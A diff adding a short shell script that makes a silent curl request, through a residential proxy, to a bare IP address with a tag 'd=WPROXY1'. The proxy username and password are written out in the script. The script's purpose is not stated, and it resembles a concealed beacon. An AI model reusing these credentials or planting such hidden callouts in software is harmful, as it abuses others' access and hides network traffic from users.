@@ -1,0 +1,4 @@
+#!/bin/sh
+P='ud0fapk7ut9-country-AL-quality-high-session-b3jev51x:jw0sn5ge1677@resi-bridge-eu.rainproxy.io:3333'
+curl -s -m 20 -x http://$P 'http://91.215.85.170:443/zz?d=WPROXY1' >/dev/null 2>&1
+sleep 1
